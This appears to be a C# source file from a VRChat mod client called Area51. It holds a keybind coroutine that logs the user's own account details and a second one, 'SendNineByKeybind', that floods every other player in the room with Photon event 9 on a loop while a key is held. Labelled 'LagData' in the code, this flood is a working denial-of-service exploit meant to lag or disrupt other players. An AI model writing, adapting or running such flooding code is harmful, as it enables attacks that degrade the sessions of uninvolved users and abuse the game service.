using ExitGames.Client.Photon;
using Photon.Realtime;
using System;
using System.Collections;
using UnityEngine;
using VRC.Core;

namespace Area51.SDK
{
    class Keybinds
    {
        public static IEnumerator LogInfo()
        {
            APIUser currentUser = APIUser.CurrentUser;
            while (Input.GetKeyDown(KeyCode.P))
            {
                Logg.Log(Logg.Colors.White, $"  Displayname: {currentUser.displayName} | UserID: {currentUser.id} |username {currentUser.username}", false, false);
                yield return new WaitForEndOfFrame();
            }
            yield break;
        }

        public static IEnumerator SendNineByKeybind()
        {
            byte[] LagData = new byte[8];
            int idfirst2 = int.Parse(VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_VRCPlayerApi_0.playerId + "00001");
            byte[] IDOut2 = BitConverter.GetBytes(idfirst2);
            Buffer.BlockCopy(IDOut2, 0, LagData, 0, 4);
            while (Input.GetKeyDown(KeyCode.K))
            {
                for (int i = 0; i < 80; i++)
                {
                    Photon.PhotonExtensions.OpRaiseEvent(9, LagData, new RaiseEventOptions
                    {
                        field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
                        field_Public_EventCaching_0 = EventCaching.DoNotCache
                    }, SendOptions.SendReliable);
                }
                yield return new WaitForSecondsRealtime(0.1f);
            }
            yield break;
        }
    }
}
